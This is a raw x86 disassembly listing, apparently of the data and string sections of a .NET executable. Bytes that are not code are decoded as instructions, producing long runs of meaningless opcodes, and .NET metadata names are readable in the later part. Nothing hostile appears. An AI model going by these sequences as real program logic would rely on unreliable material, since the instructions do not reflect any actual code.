  406b90:	int    0x23
  406b92:	loope  0x406b95
  406b94:	cdq    
  406b95:	adc    ebx,DWORD PTR [eax+0x27]
  406b98:	xor    DWORD PTR [ecx],eax
  406b9a:	mov    al,ds:0x69275d11
  406b9f:	add    bh,bl
  406ba1:	adc    eax,0x69277b
  406ba6:	call   0x3167bdc0
  406bab:	add    ecx,esi
  406bad:	adc    eax,0x5926cb
  406bb2:	pop    es
  406bb3:	push   ss
  406bb4:	cdq    
  406bb5:	daa    
  406bb6:	xor    DWORD PTR [edx],eax
  406bb8:	inc    ebx
  406bb9:	push   ss
  406bba:	lahf   
  406bbb:	daa    
  406bbc:	dec    ecx
  406bbd:	add    bh,BYTE PTR [ecx+0x6]
  406bc0:	pop    ds
  406bc1:	and    al,0x51
  406bc3:	add    bh,BYTE PTR [ecx+0x6]
  406bc6:	jmp    0x7942ccf2
  406bcb:	push   es
  406bcc:	pop    ecx
  406bcd:	and    eax,DWORD PTR [ecx-0x6e951ff]
  406bd3:	daa    
  406bd4:	imul   eax,DWORD PTR [edx],0x27ff0679
  406bda:	add    DWORD PTR [ecx],0x280516d4
  406be0:	jno    0x406be2
  406be2:	pop    ebx
  406be3:	pop    es
  406be4:	popf   
  406be5:	and    eax,DWORD PTR [ecx+0x5816f601]
  406beb:	daa    
  406bec:	pop    ecx
  406bed:	add    BYTE PTR [edx],al
  406bef:	pop    ss
  406bf0:	push   ds
  406bf1:	daa    
  406bf2:	xchg   ecx,eax
  406bf3:	add    DWORD PTR [ecx+0x6],edi
  406bf6:	pop    ds
  406bf7:	and    al,0x31
  406bf9:	add    DWORD PTR [ecx+0x79281108],esi
  406bff:	add    ch,BYTE PTR [edi]
  406c01:	pop    ss
  406c02:	sbb    eax,0x35005923
  406c07:	pop    ss
  406c08:	popf   
  406c09:	and    eax,DWORD PTR [ecx+0x1f067902]
  406c0f:	and    al,0x59
  406c11:	add    BYTE PTR [esi],al
  406c13:	adc    bl,BYTE PTR [ebp+0x32005923]
  406c19:	adc    ebx,DWORD PTR [ebp+0x60028923]
  406c1f:	pop    ss
  406c20:	pop    ebx
  406c21:	sub    BYTE PTR [ecx+0x65177d02],cl
  406c27:	sub    BYTE PTR [ecx+0x6c179701],dl
  406c2d:	sub    BYTE PTR [ecx-0x32e85cfe],dl
  406c33:	and    edx,DWORD PTR [ecx-0x32e852fe]
  406c39:	and    ebx,DWORD PTR [ecx+0x59067902]
  406c3f:	and    esp,DWORD PTR [ecx-0x77f986fe]
  406c45:	sub    BYTE PTR [ecx-0x6cf986fe],bh
  406c4b:	sub    BYTE PTR [ecx-0x64e80bfe],bh
  406c51:	sub    cl,al
  406c53:	add    cl,BYTE PTR [esi]
  406c55:	sbb    BYTE PTR [ecx+0x13013128],ah
  406c5b:	sbb    BYTE PTR [ecx+0x1b013128],ch
  406c61:	sbb    BYTE PTR [ebp-0x63fd66dd],bl
  406c67:	adc    eax,0x2d128ae
  406c6c:	sub    ebx,DWORD PTR [eax]
  406c6e:	popf   
  406c6f:	and    edx,ecx
  406c71:	add    dh,BYTE PTR [eax+ebx*1]
  406c74:	pop    ecx
  406c75:	and    ebx,DWORD PTR [ecx-0x32e7c5fe]
  406c7b:	and    ebx,DWORD PTR [ecx-0x4ce7bbfe]
  406c81:	sub    BYTE PTR [ecx-0x37e7a8ff],bh
  406c87:	sub    cl,bl
  406c89:	add    ah,BYTE PTR [ecx+0x18]
  406c8c:	into   
  406c8d:	sub    cl,bl
  406c8f:	add    ah,BYTE PTR [ecx+0x18]
  406c92:	aad    0x28
  406c94:	fld    DWORD PTR [edx]
  406c96:	popa   
  406c97:	sbb    ch,bl
  406c99:	sub    cl,bl
  406c9b:	add    ah,BYTE PTR [ecx+0x18]
  406c9e:	jmp    0xd318:0x6101b928
  406ca5:	and    al,0xe
  406ca7:	add    BYTE PTR [eax+eax*1],al
  406caa:	or     eax,0x8000e00
  406caf:	add    BYTE PTR [eax+eax*1],bl
  406cb2:	push   cs
  406cb3:	add    BYTE PTR [eax+eax*1],cl
  406cb6:	sbb    al,0x0
  406cb8:	push   cs
  406cb9:	add    BYTE PTR [eax],dl
  406cbb:	add    BYTE PTR [ebx],ch
  406cbd:	add    BYTE PTR [esi],cl
  406cbf:	add    BYTE PTR [eax+eax*1],dl
  406cc2:	sub    eax,DWORD PTR [eax]
  406cc4:	push   cs
  406cc5:	add    BYTE PTR [eax],bl
  406cc7:	add    BYTE PTR [ebx],ch
  406cc9:	add    BYTE PTR [esi],cl
  406ccb:	add    BYTE PTR [eax+eax*1],bl
  406cce:	inc    eax
  406ccf:	add    BYTE PTR [esi],cl
  406cd1:	add    BYTE PTR [eax],ah
  406cd3:	add    BYTE PTR [eax+eax*1],bl
  406cd6:	push   cs
  406cd7:	add    BYTE PTR [eax+eax*1],ah
  406cda:	popf   
  406cdb:	add    BYTE PTR [eax],cl
  406cdd:	add    BYTE PTR [eax],ch
  406cdf:	add    BYTE PTR [edi+0x2c000e00],dh
  406ce5:	add    BYTE PTR [eax+eax*1+0x30000e],bh
  406cec:	mov    esp,0x34000e00
  406cf1:	add    ch,bl
  406cf3:	add    BYTE PTR [esi],cl
  406cf5:	add    BYTE PTR [eax],bh
  406cf7:	add    BYTE PTR [esi],bl
  406cf9:	add    DWORD PTR [esi],ecx
  406cfb:	add    BYTE PTR [eax+eax*1],bh
  406cfe:	mov    dh,0x1
  406d00:	push   cs
  406d01:	add    BYTE PTR [eax+0x0],al
  406d04:	push   esp
  406d05:	add    cl,BYTE PTR [esi]
  406d07:	add    BYTE PTR [eax+eax*1+0xc],al
  406d0b:	add    ecx,DWORD PTR [esi]
  406d0d:	add    BYTE PTR [eax+0x0],cl
  406d10:	mov    al,ds:0x4c000e03
  406d15:	add    BYTE PTR [esi+0x4],dl
  406d18:	push   cs
  406d19:	add    BYTE PTR [eax+0x0],dl
  406d1c:	push   es
  406d1d:	add    eax,0x54000e
  406d22:	mov    ds:0x58000e05,al
  406d27:	add    BYTE PTR [edx+0x5c000e05],ah
  406d2d:	add    bl,al
  406d2f:	add    eax,0x60000e
  406d34:	inc    ebp
  406d35:	or     BYTE PTR [esi],cl
  406d37:	add    BYTE PTR [eax+eax*1+0x45],ah
  406d3b:	or     BYTE PTR [esi],cl
  406d3d:	add    BYTE PTR [eax+0x0],ch
  406d40:	data16 or BYTE PTR [esi],cl
  406d43:	add    BYTE PTR [eax+eax*1-0x18],ch
  406d47:	or     cl,BYTE PTR [esi]
  406d49:	add    BYTE PTR [eax+0x0],dh
  406d4c:	mov    edx,0x74000e0b
  406d51:	add    BYTE PTR [edx+0xc],ch
  406d54:	push   cs
  406d55:	add    BYTE PTR [eax+0x0],bh
  406d58:	sub    cl,BYTE PTR ds:0x7c000e
  406d5e:	aam    0xd
  406d60:	push   cs
  406d61:	add    BYTE PTR [eax+0xe0e7600],al
  406d67:	add    BYTE PTR [eax+eax*1+0xe0f2e],al
  406d6e:	mov    BYTE PTR [eax],al
  406d70:	loopne 0x406d81
  406d72:	push   cs
  406d73:	add    BYTE PTR [eax+eax*1+0xe1084],cl
  406d7a:	nop
  406d7b:	add    BYTE PTR [esi],bh
  406d7d:	adc    DWORD PTR [esi],ecx
  406d7f:	add    BYTE PTR [eax+eax*1+0xe11e8],dl
  406d86:	cwde   
  406d87:	add    BYTE PTR [eax-0x63fff1ee],dl
  406d8d:	add    BYTE PTR [eax+0x13],dh
  406d90:	push   cs
  406d91:	add    BYTE PTR [eax+0xe141600],ah
  406d97:	add    BYTE PTR [eax+eax*1+0xe14c8],ah
  406d9e:	test   al,0x0
  406da0:	fs adc eax,0xac000e
  406da6:	sbb    dl,BYTE PTR [esi]
  406da8:	push   cs
  406da9:	add    BYTE PTR [eax+0xe16ce00],dh
  406daf:	add    BYTE PTR [eax+eax*1+0xe1790],dh
  406db6:	mov    eax,0xe184800
  406dbb:	add    BYTE PTR [eax+eax*1+0xe18fa],bh
  406dc2:	rol    BYTE PTR [eax],0xba
  406dc5:	sbb    DWORD PTR [esi],ecx
  406dc7:	add    ah,al
  406dc9:	add    BYTE PTR [edx+ebx*1+0xe],ah
  406dcd:	add    al,cl
  406dcf:	add    BYTE PTR [esi],ah
  406dd1:	sbb    ecx,DWORD PTR [esi]
  406dd3:	add    ah,cl
  406dd5:	add    dl,dl
  406dd7:	sbb    ecx,DWORD PTR [esi]
  406dd9:	add    al,dl
  406ddb:	add    BYTE PTR [eax-0x2bfff1e4],al
  406de1:	add    BYTE PTR [ebx*1+0xd8000e],dh
  406de8:	add    al,0x1e
  406dea:	push   cs
  406deb:	add    ah,bl
  406ded:	add    BYTE PTR [edx-0x1ffff1e2],dh
  406df3:	add    bl,dl
  406df5:	push   ds
  406df6:	push   cs
  406df7:	add    ah,ah
  406df9:	add    BYTE PTR [edi-0x17fff1e1],al
  406dff:	add    BYTE PTR [edi],dh
  406e01:	and    BYTE PTR [esi],cl
  406e03:	add    ah,ch
  406e05:	add    bl,dh
  406e07:	and    BYTE PTR [esi],cl
  406e09:	add    al,dh
  406e0b:	add    BYTE PTR [ecx-0xbfff1df],dh
  406e11:	add    BYTE PTR [edi+0x22],ch
  406e14:	or     BYTE PTR [eax],al
  406e16:	cld    
  406e17:	add    BYTE PTR [ebp+0x23],bl
  406e1a:	or     BYTE PTR [eax],al
  406e1c:	add    BYTE PTR [ecx],al
  406e1e:	bound  esp,QWORD PTR [ebx]
  406e20:	or     BYTE PTR [eax],al
  406e22:	add    al,0x1
  406e24:	and    ecx,DWORD PTR [bx+si]
  406e27:	add    BYTE PTR [eax],bh
  406e29:	add    DWORD PTR [ebp+0x23],ebx
  406e2c:	or     BYTE PTR [eax],al
  406e2e:	cmp    al,0x1
  406e30:	lock and ecx,DWORD PTR [eax]
  406e33:	add    BYTE PTR [eax+0x1],al
  406e36:	cmc    
  406e37:	and    ecx,DWORD PTR [eax]
  406e39:	add    BYTE PTR [ecx+eax*1-0x6],al
  406e3d:	and    ecx,DWORD PTR [eax]
  406e3f:	add    BYTE PTR [eax+0x1],cl
  406e42:	jmp    DWORD PTR [ebx]
  406e44:	or     BYTE PTR [eax],al
  406e46:	pusha  
  406e47:	add    DWORD PTR [ebp+0x23],ebx
  406e4a:	or     BYTE PTR [eax],al
  406e4c:	add    DWORD PTR fs:[edx+0x23],esp
  406e50:	or     BYTE PTR [eax],al
  406e52:	push   0x2e236701
  406e57:	add    BYTE PTR [ebx+0x0],al
  406e5a:	daa    
  406e5b:	sub    DWORD PTR [esi],ebp
  406e5d:	add    BYTE PTR [ebx+0x2e29e200],bl
  406e63:	add    BYTE PTR [ebx],dl
  406e65:	add    al,dh
  406e67:	sub    BYTE PTR [esi],ch
  406e69:	add    BYTE PTR [ebx],bl
  406e6b:	add    dh,dh
  406e6d:	sub    BYTE PTR [esi],ch
  406e6f:	add    BYTE PTR [ebx],ah
  406e71:	add    ah,bh
  406e73:	sub    BYTE PTR [esi],ch
  406e75:	add    BYTE PTR [ebx],ch
  406e77:	add    ah,bh
  406e79:	sub    BYTE PTR [esi],ch
  406e7b:	add    BYTE PTR [ebx],dh
  406e7d:	add    ah,bh
  406e7f:	sub    BYTE PTR [esi],ch
  406e81:	add    BYTE PTR [ebx],bh
  406e83:	add    BYTE PTR [ecx+ebp*1],cl
  406e86:	add    BYTE PTR cs:[ebx+0x0],cl
  406e8a:	inc    edi
  406e8b:	sub    DWORD PTR [esi],ebp
  406e8d:	add    BYTE PTR [ebx+0x0],bl
  406e90:	jl     0x406ebb
  406e92:	add    BYTE PTR cs:[ebx+0x0],ah
  406e96:	jl     0x406ec1
  406e98:	add    BYTE PTR cs:[ebx+0x0],ch
  406e9c:	lea    ebp,[ecx]
  406e9e:	add    BYTE PTR cs:[ebx+0x0],dh
  406ea2:	call   0xf600:0x7b002e29
  406ea9:	sub    BYTE PTR [esi],ch
  406eab:	add    BYTE PTR [ebx+0x2e29a500],al
  406eb1:	add    BYTE PTR [ebx+0x2e29d000],cl
  406eb7:	add    BYTE PTR [ebx+0x2329d900],dl
  406ebd:	add    ch,BYTE PTR [ebx]
  406ebf:	add    esi,eax
  406ec1:	daa    
  406ec2:	and    eax,DWORD PTR [edx]
  406ec4:	and    eax,DWORD PTR [ebx]
  406ec6:	mov    edi,0x2b028327
  406ecb:	add    esi,eax
  406ecd:	daa    
  406ece:	add    DWORD PTR [edx],0x23
  406ed1:	add    esi,DWORD PTR [ecx]
  406ed3:	sub    bl,dl
  406ed5:	and    eax,0x25eb25e6
  406eda:	inc    eax
  406edb:	and    DWORD PTR es:[esi],0xffffff89
  406edf:	es fwait
  406ee1:	les    esp,FWORD PTR es:[esi]
  406ee4:	xlat   BYTE PTR ds:[ebx]
  406ee5:	fsub   QWORD PTR es:[esi]
  406ee8:	cli    
  406ee9:	es or  al,0x27
  406eec:	sbb    DWORD PTR [edi],esp
  406eee:	sub    ah,BYTE PTR [edi]
  406ef0:	ds daa 
  406ef2:	dec    esp
  406ef3:	daa    
  406ef4:	arpl   WORD PTR [edi],sp
  406ef6:	and    BYTE PTR [edi],0x94
  406ef9:	daa    
  406efa:	stos   DWORD PTR es:[edi],eax
  406efb:	daa    
  406efc:	mov    ah,0x27
  406efe:	or     al,0x28
  406f00:	sbb    DWORD PTR [eax],ebp
  406f02:	jb     0x406f2c
  406f04:	mov    eax,0x928e428
  406f09:	add    BYTE PTR [ecx],al
  406f0b:	add    BYTE PTR [ebx],cl
  406f0d:	add    BYTE PTR [ebx],al
  406f0f:	add    BYTE PTR [esi],cl
  406f11:	add    BYTE PTR ds:0x8000f00,al
  406f17:	add    BYTE PTR [eax],al
  406f19:	add    BYTE PTR [esi+0x7],ch
  406f1c:	mov    eax,ds:0x73000023
  406f21:	pop    es
  406f22:	mov    eax,ds:0x1d000023
  406f27:	or     dh,dl
  406f29:	and    eax,DWORD PTR [eax]
  406f2b:	add    BYTE PTR ds:0x23d608,ah
  406f31:	add    BYTE PTR [eax],dl
  406f33:	or     DWORD PTR [edx],ebx
  406f35:	and    al,0x0
  406f37:	add    BYTE PTR [esi],dl
  406f39:	or     esi,edx
  406f3b:	and    eax,DWORD PTR [eax]
  406f3d:	add    BYTE PTR [ebx],ah
  406f3f:	or     esi,edx
  406f41:	and    eax,DWORD PTR [eax]
  406f43:	add    BYTE PTR [ecx+0x23a109],dl
  406f49:	add    BYTE PTR [ebp+0x2243309],bl
  406f4f:	add    BYTE PTR [ecx],bl
  406f51:	add    BYTE PTR [ebx],al
  406f53:	add    BYTE PTR [edx],al
  406f55:	add    BYTE PTR [edx],bl
  406f57:	add    BYTE PTR ds:0x1e000200,al
  406f5d:	add    BYTE PTR [edi],al
  406f5f:	add    BYTE PTR [edx],al
  406f61:	add    BYTE PTR [edi],bl
  406f63:	add    BYTE PTR [ecx],cl
  406f65:	add    BYTE PTR [edx],al
  406f67:	add    BYTE PTR [edi],ah
  406f69:	add    BYTE PTR [ebx],cl
  406f6b:	add    BYTE PTR [edx],al
  406f6d:	add    BYTE PTR [eax],ch
  406f6f:	add    BYTE PTR ds:0x29000200,cl
  406f75:	add    BYTE PTR [edi],cl
  406f77:	add    BYTE PTR [edx],al
  406f79:	add    BYTE PTR [ebx],ch
  406f7b:	add    BYTE PTR [ecx],dl
  406f7d:	add    BYTE PTR [edx],al
  406f7f:	add    BYTE PTR [eax+eax*1],ch
  406f82:	adc    eax,DWORD PTR [eax]
  406f84:	add    DWORD PTR [eax],eax
  406f86:	sub    eax,0xe6001300
  406f8b:	adc    al,0x4d
  406f8d:	push   ss
  406f8e:	pop    edx
  406f8f:	push   ss
  406f90:	inc    esi
  406f91:	add    DWORD PTR [ecx],ebp
  406f93:	add    BYTE PTR [edx],bl
  406f95:	pop    es
  406f96:	add    DWORD PTR [eax],eax
  406f98:	push   es
  406f99:	add    DWORD PTR [ebx],ebp
  406f9b:	add    BYTE PTR ds:0x6000107,ah
  406fa1:	add    DWORD PTR [ebp+0x0],esi
  406fa4:	and    eax,0x46000107
  406fa9:	add    DWORD PTR [edi+0x0],esi
  406fac:	sbb    al,BYTE PTR [edi]
  406fae:	add    DWORD PTR [eax],eax
  406fb0:	add    al,0x1
  406fb2:	jns    0x406fb4
  406fb4:	outs   dx,DWORD PTR ds:[esi]
  406fb5:	or     al,BYTE PTR [edx]
  406fb7:	add    BYTE PTR [ecx+eax*1],al
  406fba:	jnp    0x406fbc
  406fbc:	jge    0x406fc8
  406fbe:	add    eax,DWORD PTR [eax]
  406fc0:	add    al,0x1
  406fc2:	jge    0x406fc4
  406fc4:	xchg   ebp,eax
  406fc5:	or     al,BYTE PTR [ebx]
  406fc7:	add    BYTE PTR [eax+eax*4],al
  406fca:	add    BYTE PTR [eax],al
  406fcc:	add    eax,DWORD PTR [eax]
  406fce:	add    eax,0x0
  406fd3:	add    BYTE PTR [ecx],al
  406fd5:	add    BYTE PTR [eax],al
  406fd7:	add    BYTE PTR [edx],dl
  406fd9:	and    eax,0x5c
  406fde:	add    al,BYTE PTR [eax]
	...
  406fe8:	add    BYTE PTR [eax],al
  406fea:	add    DWORD PTR [eax],eax
  406fec:	daa    
  406fed:	add    DWORD PTR [eax],eax
  406fef:	add    BYTE PTR [eax],al
  406ff1:	add    BYTE PTR [eax],al
  406ff3:	add    BYTE PTR [eax],al
  406ff5:	add    BYTE PTR [ecx],al
  406ff7:	add    BYTE PTR [eax],al
  406ff9:	add    BYTE PTR [ebx+0x18],ch
  406ffc:	add    BYTE PTR [eax],al
  406ffe:	add    BYTE PTR [eax],al
  407000:	add    BYTE PTR [ecx*2+0x6c75646f],bh
  407007:	gs add BYTE PTR ds:[esp+ebp*2+0x62],dl
  40700d:	inc    ebp
  40700e:	js     0x407080
  407010:	cs gs js 0x407079
  407014:	add    BYTE PTR [esi+0x58],al
  407017:	xor    dh,BYTE PTR [eax]
  407019:	inc    ecx
  40701a:	jae    0x40708f
  40701c:	gs ins DWORD PTR es:[edi],dx
  40701e:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407022:	inc    esi
  407023:	pop    eax
  407024:	xor    esi,DWORD PTR ds:0x65737341
  40702a:	ins    DWORD PTR es:[edi],dx
  40702b:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40702f:	inc    esi
  407030:	pop    eax
  407031:	inc    ecx
  407032:	jae    0x4070a7
  407034:	gs ins DWORD PTR es:[edi],dx
  407036:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  40703a:	push   esp
  40703b:	push   0x73417369
  407040:	jae    0x4070a7
  407042:	ins    DWORD PTR es:[edi],dx
  407043:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407047:	inc    ecx
  407048:	jae    0x4070bd
  40704a:	gs ins DWORD PTR es:[edi],dx
  40704c:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  407050:	data16 add BYTE PTR gs:[edx+0x65],dl
  407055:	jae    0x4070c6
  407057:	jne    0x4070cb
  407059:	arpl   WORD PTR [ebp+0x0],sp
  40705c:	push   esp
  40705d:	ins    BYTE PTR es:[edi],dx
  40705e:	bound  eax,QWORD PTR [ebp+0x78]
  407061:	jo     0x407063
  407063:	dec    edi
  407064:	jo     0x4070da
  407066:	imul   ebp,DWORD PTR [edi+0x6e],0x62624100
  40706d:	jb     0x4070d4
  40706f:	jbe    0x4070e4
  407071:	add    BYTE PTR [ebx+0x6f],al
  407074:	ins    DWORD PTR es:[edi],dx
  407075:	ins    DWORD PTR es:[edi],dx
  407076:	popa   
  407077:	outs   dx,BYTE PTR ds:[esi]
  407078:	fs dec esp
  40707a:	imul   ebp,DWORD PTR [esi+0x65],0x6d655200
  407081:	outs   dx,DWORD PTR ds:[esi]
  407082:	je     0x4070e9
  407084:	push   esp
  407085:	ins    BYTE PTR es:[edi],dx
  407086:	bound  eax,QWORD PTR [ebp+0x78]
  407089:	jo     0x40708b
  40708b:	push   esp
  40708c:	ins    BYTE PTR es:[edi],dx
  40708d:	bound  eax,QWORD PTR [ebp+0x78]
  407090:	jo     0x4070d5
  407092:	outs   dx,DWORD PTR ds:[esi]
  407093:	fs add BYTE PTR gs:[edx+0x45],dl
  407098:	inc    edi
  407099:	dec    ebx
  40709a:	dec    ecx
  40709b:	dec    esi
  40709c:	inc    esp
  40709d:	add    BYTE PTR [esp+ebp*2+0x62],dl
  4070a1:	dec    ebx
  4070a2:	gs jns 0x4070a5
  4070a5:	push   edx
  4070a6:	gs push sp
  4070a9:	ins    BYTE PTR es:[edi],dx
  4070aa:	bound  ecx,QWORD PTR [ecx+0x6e]
  4070ad:	outs   dx,WORD PTR ds:[esi]
  4070af:	add    BYTE PTR [ecx+0x54],cl
  4070b2:	jns    0x407124
  4070b4:	gs dec esp
  4070b6:	imul   esp,DWORD PTR [edx+0x52],0x6c6f7365
  4070bd:	jbe    0x407124
  4070bf:	jb     0x4070c1
  4070c1:	push   edx
  4070c2:	gs push sp
  4070c5:	ins    BYTE PTR es:[edi],dx
  4070c6:	bound  edx,QWORD PTR [edx+0x65]
  4070c9:	jae    0x40713a
  4070cb:	ins    BYTE PTR es:[edi],dx
  4070cc:	jbe    0x407133
  4070ce:	jb     0x4070d0
  4070d0:	inc    ecx
  4070d1:	jae    0x407146
  4070d3:	gs ins DWORD PTR es:[edi],dx
  4070d5:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  4070d9:	gs jae 0x40714b
  4070dc:	ins    BYTE PTR es:[edi],dx
  4070dd:	jbe    0x407144
  4070df:	jb     0x4070e1
  4070e1:	dec    ecx
  4070e2:	inc    ebx
  4070e3:	jb     0x40714a
  4070e5:	popa   
  4070e6:	je     0x40714d
  4070e8:	dec    ecx
  4070e9:	push   esp
  4070ea:	jns    0x40715c
  4070ec:	gs dec esp
  4070ee:	imul   esp,DWORD PTR [edx+0x0],0x6f707845
  4070f5:	jb     0x40716b
  4070f7:	gs jb  0x40713d
  4070fa:	popa   
  4070fb:	ins    BYTE PTR es:[edi],dx
  4070fc:	ins    BYTE PTR es:[edi],dx
  4070fd:	bound  esp,QWORD PTR [ecx+0x63]
  407100:	imul   eax,DWORD PTR [eax],0x54
  407103:	ins    BYTE PTR es:[edi],dx
  407104:	bound  eax,QWORD PTR [ebp+0x78]
  407107:	jo     0x407158
  407109:	jo     0x40717f
  40710b:	imul   ebp,DWORD PTR [edi+0x6e],0x754f0073
  407112:	je     0x407184
  407114:	jne    0x40718a
  407116:	add    BYTE PTR [esi+0x6f],al
  407119:	jb     0x407188
  40711b:	popa   
  40711c:	je     0x407192
  40711e:	gs fs dec edi
  407121:	jne    0x407197
  407123:	jo     0x40719a
  407125:	je     0x407127
  407127:	ins    DWORD PTR es:[edi],dx
  407128:	jae    0x40718d
  40712a:	outs   dx,DWORD PTR ds:[esi]
  40712b:	jb     0x407199
  40712d:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  407134:	gs ins DWORD PTR es:[edi],dx
  407136:	add    BYTE PTR [edi+0x62],cl
  407139:	push   0x65
  40713b:	arpl   WORD PTR [eax+eax*1+0x4d],si
  40713f:	popa   
  407140:	jb     0x4071b5
  407142:	push   0x79426c61
  407147:	push   edx
  407148:	gs dec di
  40714b:	bound  ebp,QWORD PTR [edx+0x65]
  40714e:	arpl   WORD PTR [eax+eax*1+0x45],si
  407152:	outs   dx,BYTE PTR ds:[esi]
  407153:	jne    0x4071c2
  407155:	add    BYTE PTR [ebx+0x79],dl
  407158:	jae    0x4071ce
  40715a:	gs ins DWORD PTR es:[edi],dx
  40715c:	cs push edx
  40715e:	jne    0x4071ce
  407160:	je     0x4071cb
  407162:	ins    DWORD PTR es:[edi],dx
  407163:	gs cs dec ecx
  407166:	outs   dx,BYTE PTR ds:[esi]
  407167:	je     0x4071ce
  407169:	jb     0x4071da
  40716b:	jo     0x4071c0
  40716d:	gs jb  0x4071e6
  407170:	imul   esp,DWORD PTR [ebx+0x65],0x54490073
  407177:	jns    0x4071e9
  407179:	gs dec esp
  40717b:	imul   esp,DWORD PTR [edx+0x45],0x726f7078
  407182:	je     0x4071e9
  407184:	jb     0x4071d4
  407186:	outs   dx,DWORD PTR ds:[esi]
  407187:	je     0x4071f2
  407189:	data16 jns 0x4071df
  40718c:	imul   ebp,DWORD PTR [esi+0x6b],0x79544900
  407193:	jo     0x4071fa
  407195:	dec    esp
  407196:	imul   esp,DWORD PTR [edx+0x45],0x726f7078
  40719d:	je     0x407204
  40719f:	jb     0x4071ef
  4071a1:	popa   
  4071a2:	ins    DWORD PTR es:[edi],dx
  4071a3:	gs push eax
  4071a5:	jb     0x407216
  4071a7:	jbe    0x407212
  4071a9:	fs gs jb 0x4071ad
  4071ad:	push   esi
  4071ae:	gs jb  0x407224
  4071b1:	imul   ebp,DWORD PTR [edi+0x6e],0x74695400
  4071b8:	ins    BYTE PTR es:[edi],dx
  4071b9:	add    BYTE PTR gs:[ebp+eiz*2+0x73],al
  4071be:	arpl   WORD PTR [edx+0x69],si
  4071c1:	jo     0x407237
  4071c3:	imul   ebp,DWORD PTR [edi+0x6e],0x66654400
  4071ca:	popa   
  4071cb:	jne    0x407239
  4071cd:	je     0x407210
  4071cf:	ins    BYTE PTR es:[edi],dx
  4071d0:	imul   esp,DWORD PTR [ecx+0x73],0x706f4300
  4071d7:	jns    0x40724b
  4071d9:	imul   esp,DWORD PTR [edi+0x68],0x6e490074
  4071e0:	outs   dx,WORD PTR ds:[esi]
  4071e2:	jb     0x407251
  4071e4:	popa   
  4071e5:	je     0x407250
  4071e7:	outs   dx,DWORD PTR ds:[esi]
  4071e8:	outs   dx,BYTE PTR ds:[esi]
  4071e9:	popa   
  4071ea:	ins    BYTE PTR es:[edi],dx
  4071eb:	push   esi
  4071ec:	gs jb  0x407262
  4071ef:	imul   ebp,DWORD PTR [edi+0x6e],0x69614400
  4071f6:	ins    BYTE PTR es:[edi],dx
  4071f7:	jns    0x40723b
  4071f9:	jne    0x407264
  4071fb:	ins    BYTE PTR es:[edi],dx
  4071fc:	fs dec esi
  4071fe:	jne    0x40726d
  407200:	bound  esp,QWORD PTR [ebp+0x72]
  407203:	add    BYTE PTR [ebp+0x63],al
  407206:	ins    DWORD PTR es:[edi],dx
  407207:	popa   
  407208:	push   eax
  407209:	jne    0x40726d
  40720b:	ins    BYTE PTR es:[edi],dx
  40720c:	imul   esp,DWORD PTR [ebx+0x4b],0x45007965
  407213:	arpl   WORD PTR [ebp+0x61],bp
  407216:	push   eax
  407217:	jne    0x40727b
  407219:	ins    BYTE PTR es:[edi],dx
  40721a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  407221:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  407225:	inc    ebp
  407226:	arpl   WORD PTR [ebp+0x61],bp
  407229:	push   eax
  40722a:	jne    0x40728e
  40722c:	ins    BYTE PTR es:[edi],dx
  40722d:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  407234:	ins    BYTE PTR es:[edi],dx
  407235:	ins    BYTE PTR es:[edi],dx
  407236:	add    BYTE PTR [ebp+0x73],cl
  407239:	arpl   WORD PTR [edi+0x72],bp
  40723c:	ins    BYTE PTR es:[edi],dx
  40723d:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  407244:	gs ins DWORD PTR es:[edi],dx
  407246:	inc    esp
  407247:	popa   
  407248:	je     0x4072ab
  40724a:	add    BYTE PTR [ebx+0x79],dl
  40724d:	jae    0x4072c3
  40724f:	gs ins DWORD PTR es:[edi],dx
  407251:	inc    esp
  407252:	popa   
  407253:	je     0x4072b6
  407255:	dec    edi
  407256:	jb     0x4072b9
  407258:	arpl   WORD PTR [ebp+eiz*2+0x43],bp
  40725c:	ins    BYTE PTR es:[edi],dx
  40725d:	imul   esp,DWORD PTR [ebp+0x6e],0x79530074
  407264:	jae    0x4072da
  407266:	gs ins DWORD PTR es:[edi],dx
  407268:	push   edx
  407269:	jne    0x4072d9
  40726b:	je     0x4072d6
  40726d:	ins    DWORD PTR es:[edi],dx
  40726e:	gs push edx
  407270:	gs ins DWORD PTR es:[edi],dx
  407272:	outs   dx,DWORD PTR ds:[esi]
  407273:	je     0x4072de
  407275:	outs   dx,BYTE PTR ds:[esi]
  407276:	add    BYTE PTR [bp+di+0x79],dl
  40727a:	jae    0x4072f0
  40727c:	gs ins DWORD PTR es:[edi],dx
  40727e:	push   edi
  40727f:	imul   ebp,DWORD PTR [esi+0x64],0x4673776f
  407286:	outs   dx,DWORD PTR ds:[esi]
  407287:	jb     0x4072f6
  407289:	jae    0x40728b
  40728b:	push   ebx
  40728c:	jns    0x407301
  40728e:	je     0x4072f5
  407290:	ins    DWORD PTR es:[edi],dx
  407291:	pop    eax
  407292:	ins    DWORD PTR es:[edi],dx
  407293:	ins    BYTE PTR es:[edi],dx
  407294:	add    BYTE PTR [ebp+0x69],cl
  407297:	arpl   WORD PTR [edx+0x6f],si
  40729a:	jae    0x40730b
  40729c:	data16 je 0x4072ef
  40729f:	jne    0x407303
  4072a1:	ins    BYTE PTR es:[edi],dx
  4072a2:	imul   esp,DWORD PTR [ebx+0x4b],0x4d007965
  4072a9:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4072b0:	je     0x407302
  4072b2:	jne    0x407316
  4072b4:	ins    BYTE PTR es:[edi],dx
  4072b5:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4072bc:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4072c0:	dec    ebp
  4072c1:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4072c8:	je     0x40731a
  4072ca:	jne    0x40732e
  4072cc:	ins    BYTE PTR es:[edi],dx
  4072cd:	imul   esp,DWORD PTR [ebx+0x4b],0x75467965
  4072d4:	ins    BYTE PTR es:[edi],dx
  4072d5:	ins    BYTE PTR es:[edi],dx
  4072d6:	add    BYTE PTR [ebx+0x68],dl
  4072d9:	popa   
